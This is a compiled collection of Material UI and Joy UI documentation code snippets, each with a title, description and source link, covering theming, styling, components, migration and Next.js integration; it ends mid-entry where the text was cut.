Theme\nDESCRIPTION: Example showing how to replace the theme.mixins.gutters() abstraction with explicit padding definitions, as the gutters abstraction has been removed in v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_11\n\nLANGUAGE: diff\nCODE:\n```\n-theme.mixins.gutters(),\n+paddingLeft: theme.spacing(2),\n+paddingRight: theme.spacing(2),\n+[theme.breakpoints.up('sm')]: {\n+  paddingLeft: theme.spacing(3),\n+  paddingRight: theme.spacing(3),\n+},\n```\n\n----------------------------------------\n\nTITLE: Configuring CSS Variable Prefix in Material UI\nDESCRIPTION: Examples of customizing the CSS variable prefix using createTheme configuration. Shows how to set a custom prefix or remove it entirely.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/configuration.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\ncreateTheme({ cssVariables: { cssVarPrefix: 'any' } });\n\n// generated stylesheet:\n// --any-palette-primary-main: ...;\n```\n\nLANGUAGE: javascript\nCODE:\n```\ncreateTheme({ cssVariables: { cssVarPrefix: '' } });\n\n// generated stylesheet:\n// --palette-primary-main: ...;\n```\n\n----------------------------------------\n\nTITLE: Styling Components with styled Function and theme.applyStyles\nDESCRIPTION: This example demonstrates using the styled function with theme.applyStyles to create a component with mode-specific styling. The applyStyles method applies different background colors based on the theme mode.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/dark-mode/dark-mode.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nimport { styled } from '@mui/material/styles';\n\nconst MyComponent = styled('div')(({ theme }) => [\n  {\n    color: '#fff',\n    backgroundColor: theme.palette.primary.main,\n    '&:hover': {\n      boxShadow: theme.shadows[3],\n      backgroundColor: theme.palette.primary.dark,\n    },\n  },\n  theme.applyStyles('dark', {\n    backgroundColor: theme.palette.secondary.main,\n    '&:hover': {\n      backgroundColor: theme.palette.secondary.dark,\n    },\n  }),\n]);\n```\n\n----------------------------------------\n\nTITLE: Creating a Vertical Linear Stepper in React\nDESCRIPTION: This snippet shows how to implement a vertical linear stepper. It uses the Stepper component with a vertical orientation, and includes Step, StepLabel, and StepContent components to display step information vertically.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/steppers/steppers.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Stepper activeStep={activeStep} orientation=\"vertical\">\n  {steps.map((step, index) => (\n    <Step key={step.label}>\n      <StepLabel\n        optional={\n          index === 2 ? (\n            <Typography variant=\"caption\">Last step</Typography>\n          ) : null\n        }\n      >\n        {step.label}\n      </StepLabel>\n      <StepContent>\n        <Typography>{step.description}</Typography>\n        <Box sx={{ mb: 2 }}>\n          <div>\n            <Button\n              variant=\"contained\"\n              onClick={handleNext}\n              sx={{ mt: 1, mr: 1 }}\n            >\n              {index === steps.length - 1 ? 'Finish' : 'Continue'}\n            </Button>\n            <Button\n              disabled={index === 0}\n              onClick={handleBack}\n              sx={{ mt: 1, mr: 1 }}\n            >\n              Back\n            </Button>\n          </div>\n        </Box>\n      </StepContent>\n    </Step>\n  ))}\n</Stepper>\n```\n\n----------------------------------------\n\nTITLE: Implementing Customized Slider in React\nDESCRIPTION: Demonstrates various ways to customize the Slider component in Material-UI, including styling and behavior modifications.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_11\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CustomizedSlider.js\"}\n```\n\n----------------------------------------\n\nTITLE: Grouping Checkboxes with FormGroup in React\nDESCRIPTION: Illustrates how to use the FormGroup component to group selection control components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/checkboxes/checkboxes.md#2025-04-22_snippet_7\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CheckboxesGroup.js\"}\n```\n\n----------------------------------------\n\nTITLE: Using Component Props for Styling with styled and sx - JavaScript\nDESCRIPTION: Illustrates the pattern for using component props in styles. With styled, a function is passed that receives props, while with sx, props are accessed inline with the component. No external dependencies except MUI for the styled or sx prop are necessary.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/styled/styled.md#2025-04-22_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst MyStyledButton = styled('button')((props) => ({\n  backgroundColor: props.myBackgroundColor,\n}));\n```\n\nLANGUAGE: javascript\nCODE:\n```\nimport Button from '@mui/material/Button';\n\nconst MyStyledButton = (props) => (\n  <Button sx={{ backgroundColor: props.myCustomColor }}>{props.children}</Button>\n);\n```\n\n----------------------------------------\n\nTITLE: Creating Accessible Text Rating in React with Material-UI\nDESCRIPTION: Demonstrates how to create an accessible rating component with text labels. This is important for meeting WCAG 2.1 success criteria and ensuring the component is usable for all users.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/rating/rating.md#2025-04-22_snippet_6\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"TextRating.js\"}\n```\n\n----------------------------------------\n\nTITLE: Basic Autocomplete Implementation in React with Joy UI\nDESCRIPTION: Demonstrates the minimal implementation of an Autocomplete component with basic options. Imports the necessary components and renders a simple autocomplete with string options.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/autocomplete/autocomplete.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Autocomplete from '@mui/joy/Autocomplete';\nimport Input from '@mui/joy/Input';\n\nexport default function App() {\n  return <Autocomplete options={['Option 1', 'Option 2']} />;\n}\n```\n\n----------------------------------------\n\nTITLE: Using the sx Prop for Inline Styling in Material UI v5 (TypeScript)\nDESCRIPTION: This TypeScript snippet demonstrates applying custom styles directly to a Material UI `Box` component using the `sx` prop, a feature introduced in v5. It sets the component's width, height, and background color (referencing theme colors like `primary.dark`). It also defines styles for the hover state (`&:hover`), changing the background color (`primary.main`) and applying responsive opacity values. This showcases how the `sx` prop allows for intuitive, inline styling using a superset of CSS, avoiding the need for the `styled()` API for one-off customizations. Requires `@mui/material/Box` and access to the Material UI theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5-migration-update.md#2025-04-22_snippet_0\n\nLANGUAGE: tsx\nCODE:\n```\n```tsx\nimport * as React from 'react';\nimport Box from '@mui/material/Box';\n\nexport default function BoxSx() {\n  return (\n    <Box\n      sx={{\n        width: 300,\n        height: 300,\n        backgroundColor: 'primary.dark',\n        '&:hover': {\n          backgroundColor: 'primary.main',\n          opacity: [0.9, 0.8, 0.7],\n        },\n      }}\n    />\n  );\n}\n```\n```\n\n----------------------------------------\n\nTITLE: Running Grid Codemod for v7 Migration\nDESCRIPTION: Command to run the Material UI codemod for upgrading from the deprecated grid to Grid v2, which automates the necessary changes to component imports and props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod v7.0.0/grid-props <path/to/folder>\n```\n\n----------------------------------------\n\nTITLE: Implementing Continuous Slider in React\nDESCRIPTION: Demonstrates how to create a basic continuous slider component using Material-UI in React. This slider allows users to select a value along a subjective range.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"ContinuousSlider.js\"}\n```\n\n----------------------------------------\n\nTITLE: Enabling CSS Cascade Layers in _app.tsx for Next.js Pages Router\nDESCRIPTION: Diff showing how to enable CSS cascade layers in the _app.tsx file for Material UI with Next.js Pages Router.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_15\n\nLANGUAGE: diff\nCODE:\n```\n+import { createEmotionCache } from '@mui/material-nextjs/v15-pagesRouter';\n  ...\n\nconst clientCache = createEmotionCache({ enableCssLayer: true });\n\n+ export default function MyApp({ emotionCache = clientCache }) {\n    return (\n+     <AppCacheProvider emotionCache={emotionCache}>\n        <Head>\n          ...\n        </Head>\n        ...\n      </AppCacheProvider>\n    );\n  }\n```\n\n----------------------------------------\n\nTITLE: Adding Hover Feedback to Rating in React with Material-UI\nDESCRIPTION: Illustrates how to display a label on hover to help users pick the correct rating value. This example uses the onChangeActive prop for hover feedback.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/rating/rating.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"HoverRating.js\"}\n```\n\n----------------------------------------\n\nTITLE: Adding New Color Palettes - Joy UI Theme\nDESCRIPTION: Demonstrates how to add a complete new color palette with TypeScript support and variant configurations for both light and dark modes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-colors/theme-colors.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport { extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  colorSchemes: {\n    light: {\n      palette: {\n        secondary: {\n          50: '#fdf2f8',\n          100: '#fce7f3',\n          200: '#fbcfe8',\n          300: '#f9a8d4',\n          400: '#f472b6',\n          500: '#ec4899',\n          600: '#db2777',\n          700: '#be185d',\n          800: '#9d174d',\n          900: '#831843',\n          solidBg: 'var(--joy-palette-secondary-400)',\n          solidActiveBg: 'var(--joy-palette-secondary-500)',\n          outlinedBorder: 'var(--joy-palette-secondary-500)',\n          outlinedColor: 'var(--joy-palette-secondary-700)',\n          outlinedActiveBg: 'var(--joy-palette-secondary-100)',\n          softColor: 'var(--joy-palette-secondary-800)',\n          softBg: 'var(--joy-palette-secondary-200)',\n          softActiveBg: 'var(--joy-palette-secondary-300)',\n          plainColor: 'var(--joy-palette-secondary-700)',\n          plainActiveBg: 'var(--joy-palette-secondary-100)',\n        },\n      },\n    },\n    dark: {\n      palette: {\n        secondary: {\n          // ... dark mode values\n        }\n      }\n    }\n  },\n});\n```\n\nLANGUAGE: typescript\nCODE:\n```\n// You can put this to any file that's included in your tsconfig\nimport type { PaletteRange } from '@mui/joy/styles';\n\ndeclare module '@mui/joy/styles' {\n  interface ColorPalettePropOverrides {\n    // apply to all Joy UI components that support `color` prop\n    secondary: true;\n  }\n\n  interface Palette {\n    // this will make the node `secondary` configurable in `extendTheme`\n    // and add `secondary` to the theme's palette.\n    secondary: PaletteRange;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Emotion Cache for TSS and Material UI\nDESCRIPTION: Setup for using TSS (TypeScript-friendly styled-components) with Material UI, including Emotion cache configuration for correct CSS injection order.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_23\n\nLANGUAGE: TypeScript\nCODE:\n```\nimport { render } from 'react-dom';\nimport { CacheProvider } from '@emotion/react';\nimport createCache from '@emotion/cache';\nimport { ThemeProvider } from '@mui/material/styles';\n\nexport const muiCache = createCache({\n  key: 'mui',\n  prepend: true,\n});\n\nrender(\n  <CacheProvider value={muiCache}>\n    <ThemeProvider theme={myTheme}>\n      <Root />\n    </ThemeProvider>\n  </CacheProvider>,\n  document.getElementById('root'),\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring Material UI Theme for React Router Integration\nDESCRIPTION: This snippet demonstrates how to configure the Material UI theme to use React Router's Link component globally. It maps Material UI's href prop to React Router's to prop using a custom LinkBehavior component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/routing/routing.md#2025-04-22_snippet_0\n\nLANGUAGE: tsx\nCODE:\n```\nimport { Link as RouterLink, LinkProps as RouterLinkProps } from 'react-router';\nimport { LinkProps } from '@mui/material/Link';\n\nconst LinkBehavior = React.forwardRef<\n  HTMLAnchorElement,\n  Omit<RouterLinkProps, 'to'> & { href: RouterLinkProps['to'] }\n>((props, ref) => {\n  const { href, ...other } = props;\n  // Map href (Material UI) -> to (react-router)\n  return <RouterLink ref={ref} to={href} {...other} />;\n});\n\nconst theme = createTheme({\n  components: {\n    MuiLink: {\n      defaultProps: {\n        component: LinkBehavior,\n      } as LinkProps,\n    },\n    MuiButtonBase: {\n      defaultProps: {\n        LinkComponent: LinkBehavior,\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Basic Links Implementation in Material-UI\nDESCRIPTION: Demonstrates basic usage of the Link component built on top of Typography component with default props color='primary' and variant='inherit'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/links/links.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"Links.js\"}\n```\n\n----------------------------------------\n\nTITLE: Split Button Implementation\nDESCRIPTION: Demonstrates how to create a split button using ButtonGroup with dropdown functionality.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/button-group/button-group.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<ButtonGroup variant=\"contained\">\n  <Button>Split Button</Button>\n  <Button size=\"small\" aria-label=\"select merge strategy\">\n    <ArrowDropDownIcon />\n  </Button>\n</ButtonGroup>\n```\n\n----------------------------------------\n\nTITLE: Implementing Theme with Material UI ThemeProvider\nDESCRIPTION: Example of how to integrate a Sync-generated theme into a Next.js application using Material UI's ThemeProvider component. Shows complete theme setup with Switch component customization.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/design-resources/material-ui-sync/material-ui-sync.md#2025-04-22_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nimport { createTheme, ThemeProvider } from '@mui/material/styles';\n\nconst theme = createTheme({\n  cssVariables: true,\n  shape: {\n    borderRadiusRound: 999,\n  },\n  components: {\n    MuiSwitch: {\n      styleOverrides: {\n        root: {\n          '&.MuiSwitch-sizeMedium:has(.MuiSwitch-colorPrimary)': {\n            '&:has(.Mui-checked):not(:has(.Mui-disabled)):not(:has(.Mui-focusVisible))': {\n              width: '40px',\n              height: '21px',\n              padding: '0',\n              '& .MuiSwitch-switchBase': {\n                transform: 'translateX(19px) translateY(2px)',\n                padding: '0',\n                '& .MuiSwitch-thumb': {\n                  width: '17px',\n                  height: '17px',\n                  background: '#FAFAFA',\n                },\n                '& + .MuiSwitch-track': {\n                  width: '38px',\n                  height: '21px',\n                  background: 'var(--mui-palette-success-light)',\n                  borderRadius: 'var(--mui-shape-borderRadiusRound)',\n                  opacity: '1',\n                },\n              },\n            },\n          },\n        },\n      },\n    },\n  },\n});\n\nexport default function MyApp(props) {\n  const { Component, pageProps } = props;\n\n  return (\n    <ThemeProvider theme={theme}>\n      <Component {...pageProps} />\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Converting JSS Styles to Styled Components\nDESCRIPTION: Example showing the transformation of JSS makeStyles to styled API, including class name handling and component structure changes\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migrating-from-jss.md#2025-04-22_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n import Typography from '@mui/material/Typography';\n-import makeStyles from '@mui/styles/makeStyles';\n+import { styled } from '@mui/material/styles';\n\n-const useStyles = makeStyles((theme) => ({\n-  root: {\n-    display: 'flex',\n-    alignItems: 'center',\n-    backgroundColor: theme.palette.primary.main\n-  },\n-  cta: {\n-    borderRadius: theme.shape.radius\n-  },\n-  content: {\n-    color: theme.palette.common.white,\n-    fontSize: 16,\n-    lineHeight: 1.7\n-  },\n-}))\n+const PREFIX = 'MyCard';\n+const classes = {\n+  root: `${PREFIX}-root`,\n+  cta: `${PREFIX}-cta`,\n+  content: `${PREFIX}-content`,\n+}\n+const Root = styled('div')(({ theme }) => ({\n+  [`&.${classes.root}`]: {\n+    display: 'flex',\n+    alignItems: 'center',\n+    backgroundColor: theme.palette.primary.main\n+  },\n+  [`& .${classes.cta}`]: {\n+    borderRadius: theme.shape.radius\n+  },\n+  [`& .${classes.content}`]: {\n+    color: theme.palette.common.white,\n+    fontSize: 16,\n+    lineHeight: 1.7\n+  },\n+}))\n\n export const MyCard = () => {\n-  const classes = useStyles();\n   return (\n-    <div className={classes.root}>\n+    <Root className={classes.root}>\n       {/* The benefit of this approach is that the code inside Root stays the same. */}\n       <Typography className={classes.content}>...</Typography>\n       <Button className={classes.cta}>Go</Button>\n-    </div>\n+    </Root>\n   )\n }\n```\n\n----------------------------------------\n\nTITLE: Using Custom Icons for Checkboxes in React\nDESCRIPTION: Shows how to use custom icons for checkboxes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/checkboxes/checkboxes.md#2025-04-22_snippet_4\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"IconCheckboxes.js\"}\n```\n\n----------------------------------------\n\nTITLE: Setting Border Color from Theme Palette with sx Prop in Material UI JSX\nDESCRIPTION: Shows how to set the border color using a theme palette path (e.g., 'primary.main') via the `borderColor` key in the `sx` prop on a Material UI Box component. The value resolves to the corresponding theme color.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ borderColor: 'primary.main' }} />\n// equivalent to borderColor: theme => theme.palette.primary.main\n```\n\n----------------------------------------\n\nTITLE: Implementing Unit Tests with createRenderer in React Testing\nDESCRIPTION: Example showing how to set up a basic test suite using @mui/internal-test-utils/createRenderer. Demonstrates proper test structure with describe and test blocks.\nSOURCE: https://github.com/mui/material-ui/blob/master/test/README.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\ndescribe('test suite', () => {\n  const { render } = createRenderer();\n\n  test('first', () => {\n    render(<input />);\n  });\n});\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Next.js Dependencies for Pages Router with yarn\nDESCRIPTION: Command to install the required dependencies for integrating Material UI with Next.js Pages Router using yarn package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/material-nextjs @emotion/cache @emotion/server\n```\n\n----------------------------------------\n\nTITLE: Using System Props on Material UI Button Component (React, JavaScript)\nDESCRIPTION: This snippet demonstrates how to import the Button component from Material UI and use the 'mt' system prop to apply responsive margin-top spacing. The 'mt' prop uses breakpoints (xs and md) to set different top margins, showcasing the integration of Material UI's system for dynamic theming and responsive design. This requires '@mui/material' to be installed and available, and must be used within a React component. Inputs include responsive props such as 'mt', while the output is a styled Button rendered in the UI; custom system props depend on correct theming and prop support in your Material UI version.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v4-is-out.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\nimport { Button } from '@mui/material';\n\n<Button mt={{ xs: 2, md: 3 }}>Hello worlds</Button>;\n```\n\n----------------------------------------\n\nTITLE: Supporting Theme Default Props in Material UI Component\nDESCRIPTION: This code snippet shows how to support theme default props in a custom Material UI component using the useThemeProps API.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/creating-themed-components/creating-themed-components.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport { useThemeProps } from '@mui/material/styles';\n\nconst Stat = React.forwardRef(function Stat(inProps, ref) {\n  const props = useThemeProps({ props: inProps, name: 'MuiStat' });\n  const { value, unit, ...other } = props;\n\n  return (\n    <StatRoot ref={ref} {...other}>\n      <StatValue>{value}</StatValue>\n      <StatUnit>{unit}</StatUnit>\n    </StatRoot>\n  );\n});\n```\n\n----------------------------------------\n\nTITLE: Wrapping Components with muiName in JSX\nDESCRIPTION: Demonstrates how to properly wrap a Material UI component while preserving the muiName static property for component identification.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/composition/composition.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nconst WrappedIcon = (props) => <Icon {...props} />;\nWrappedIcon.muiName = Icon.muiName;\n```\n\n----------------------------------------\n\nTITLE: Initializing ThemeProvider with CSS Variables in React\nDESCRIPTION: Sets up a Material-UI theme with CSS variables enabled and wraps the app with ThemeProvider. This generates CSS variables in the :root stylesheet of the HTML document.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/usage.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { ThemeProvider, createTheme } from '@mui/material/styles';\n\nconst theme = createTheme({ cssVariables: true });\n\nfunction App() {\n  return <ThemeProvider theme={theme}>{/* ...your app */}</ThemeProvider>;\n}\n```\n\nLANGUAGE: css\nCODE:\n```\n:root {\n  --mui-palette-primary-main: #1976d2;\n  --mui-palette-primary-light: #42a5f5;\n  --mui-palette-primary-dark: #1565c0;\n  --mui-palette-primary-contrastText: #fff;\n  /* ...other variables */\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Server-Side Rendering with Dark Mode in Next.js using Joy UI\nDESCRIPTION: Demonstrates how to set up server-side rendering with dark mode support in a Next.js application using Joy UI's InitColorSchemeScript component. This prevents UI flicker when users refresh or re-enter a page with dark mode enabled.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/first-look-at-joy.md#2025-04-22_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n// A Next.js example\nimport Document, { Html, Head, Main, NextScript } from 'next/document';\nimport InitColorSchemeScript from '@mui/joy/InitColorSchemeScript';\n\nexport default class MyDocument extends Document {\n  render() {\n    return (\n      <Html data-color-scheme=\"light\">\n        <Head>...</Head>\n        <body>\n          <InitColorSchemeScript />\n          <Main />\n          <NextScript />\n        </body>\n      </Html>\n    );\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Grid with Row and Column Spacing\nDESCRIPTION: Implementation demonstrating independent control of row and column gaps using rowSpacing and columnSpacing props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"RowAndColumnSpacing.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Setting Up CSS Layer Support with AppRouterCacheProvider\nDESCRIPTION: Code snippet showing how to enable CSS layer support when using other styling solutions with Material UI in Next.js App Router.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_7\n\nLANGUAGE: js\nCODE:\n```\n<AppRouterCacheProvider options={{ enableCssLayer: true }}>\n```\n\n----------------------------------------\n\nTITLE: TypeScript Interfaces for Custom Material UI Component\nDESCRIPTION: This snippet defines TypeScript interfaces for the props and ownerState of the custom Stat component in Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/creating-themed-components/creating-themed-components.md#2025-04-22_snippet_4\n\nLANGUAGE: typescript\nCODE:\n```\ninterface StatProps {\n  value: number | string;\n  unit: string;\n  variant?: 'outlined';\n}\n\ninterface StatOwnerState extends StatProps {\n  // …key value pairs for the internal state that you want to style the slot\n  // but don't want to expose to the users\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Next.js for styled-components with Material UI\nDESCRIPTION: Demonstrates how to update next.config.js to transpile MUI modules and alias the styling engine to use styled-components in a Next.js project.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/styled-components/styled-components.md#2025-04-22_snippet_3\n\nLANGUAGE: diff\nCODE:\n```\n```diff title=\"next.config.js\"\n+const withTM = require('next-transpile-modules')([\n+  '@mui/material',\n+  '@mui/system',\n+  '@mui/icons-material', // If @mui/icons-material is being used\n+]);\n\n+module.exports = withTM({\n webpack: (config) => {\n   config.resolve.alias = {\n     ...config.resolve.alias,\n+    '@mui/styled-engine': '@mui/styled-engine-sc',\n    };\n    return config;\n  }\n+});\n```\n```\n\n----------------------------------------\n\nTITLE: Extending Component Sizes in Joy UI\nDESCRIPTION: Demonstrates how to add custom size options to Joy UI components. This example adds 'xs' and 'xl' sizes to Button components with appropriate styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoyButton: {\n      styleOverrides: {\n        root: ({ ownerState, theme }) => ({\n          ...(ownerState.size === 'xs' && {\n            '--Icon-fontSize': '1rem',\n            '--Button-gap': '0.25rem',\n            minHeight: 'var(--Button-minHeight, 1.75rem)',\n            fontSize: theme.vars.fontSize.xs,\n            paddingBlock: '2px',\n            paddingInline: '0.5rem',\n          }),\n          ...(ownerState.size === 'xl' && {\n            '--Icon-fontSize': '2rem',\n            '--Button-gap': '1rem',\n            minHeight: 'var(--Button-minHeight, 4rem)',\n            fontSize: theme.vars.fontSize.xl,\n            paddingBlock: '0.5rem',\n            paddingInline: '2rem',\n          }),\n        }),\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Accessibility for Click-Away Listener\nDESCRIPTION: This example demonstrates how to improve accessibility for the Click-Away Listener component by adding a 'role' attribute to its child element. This prevents screen readers from announcing the child as clickable when it isn't.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/click-away-listener/click-away-listener.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<ClickAwayListener>\n  <div role=\"presentation\">\n    <h1>non-interactive heading</h1>\n  </div>\n</ClickAwayListener>\n```\n\n----------------------------------------\n\nTITLE: Implementing Visually Hidden Elements with Material UI Utils\nDESCRIPTION: Demonstrates how to use the visuallyHidden utility from MUI Utils to hide elements visually while keeping them accessible to screen readers. This approach works when you don't have strict Content Security Policy (CSP) restrictions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/screen-readers/screen-readers.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { visuallyHidden } from '@mui/utils';\n\n<div style={visuallyHidden}>about how to visually hide elements</div>;\n```\n\n----------------------------------------\n\nTITLE: Handling Custom Key Events in Autocomplete\nDESCRIPTION: Demonstrates how to prevent default key handler behavior in the Autocomplete component by setting the defaultMuiPrevented property.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/autocomplete/autocomplete.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n<Autocomplete\n  onKeyDown={(event) => {\n    if (event.key === 'Enter') {\n      // Prevent's default 'Enter' behavior.\n      event.defaultMuiPrevented = true;\n      // your handler code\n    }\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Implementing Theme Mode Toggle Using useColorScheme Hook\nDESCRIPTION: Shows how to use the useColorScheme hook to access and toggle between light and dark modes in a React application. This example demonstrates integrating the theme switching capability.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/experimental-api/css-theme-variables/css-theme-variables.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n// App.js\nfunction App() {\n  const { setMode, mode } = useColorScheme();\n  const toggleMode = () => {\n    setMode(mode === 'dark' ? 'light' : 'dark');\n  };\n\n  return (\n    <div>\n      <h1>Current Mode: {mode}</h1>\n      <Button onClick={toggleMode}>Toggle Mode</Button>\n    </div>\n  );\n}\n\n// main.js\nimport * as React from 'react';\nimport * as ReactDOM from 'react-dom/client';\nimport App from './App';\nimport { CssVarsProvider } from './CssVarsProvider';\n\nReactDOM.createRoot(document.getElementById('root')).render(\n  <CssVarsProvider>\n    <App />\n  </CssVarsProvider>,\n);\n```\n\n----------------------------------------\n\nTITLE: Styling Component States with Nested Selectors in Joy UI\nDESCRIPTION: Demonstrates how to use nested CSS selectors to target specific component states and interactions, such as hover effects for clickable components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoyChip: {\n      styleOverrides: {\n        root: ({ ownerState, theme }) => ({\n          ...(ownerState.variant === 'solid' &&\n            ownerState.clickable && {\n              color: 'rgba(255 255 255 / 0.72)',\n              '&:hover': {\n                color: '#fff',\n              },\n            }),\n        }),\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Controlled Checkboxes in React\nDESCRIPTION: Demonstrates how to create controlled checkboxes using the checked and onChange props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/checkboxes/checkboxes.md#2025-04-22_snippet_5\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"ControlledCheckbox.js\"}\n```\n\n----------------------------------------\n\nTITLE: Adding Accessibility Attributes to React Modal\nDESCRIPTION: This code shows how to add proper ARIA attributes to a Modal component for improved accessibility, including labels and descriptions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/modal/modal.md#2025-04-22_snippet_3\n\nLANGUAGE: JSX\nCODE:\n```\n<Modal aria-labelledby=\"modal-title\" aria-describedby=\"modal-description\">\n  <h2 id=\"modal-title\">My Title</h2>\n  <p id=\"modal-description\">My Description</p>\n</Modal>\n```\n\n----------------------------------------\n\nTITLE: Applying Color Inversion to Styled Component in React\nDESCRIPTION: Shows how to use the applySolidInversion utility with the styled API to create a custom component with color inversion capabilities. This method allows for reusable components with built-in color inversion.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/main-features/color-inversion/color-inversion.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nconst Parent = styled('div')([{ ...baseStyles }, applySolidInversion('neutral')]);\n```\n\n----------------------------------------\n\nTITLE: CSS State Classes Example\nDESCRIPTION: Example showing how to customize component states using CSS classes with proper specificity\nSOURCE: 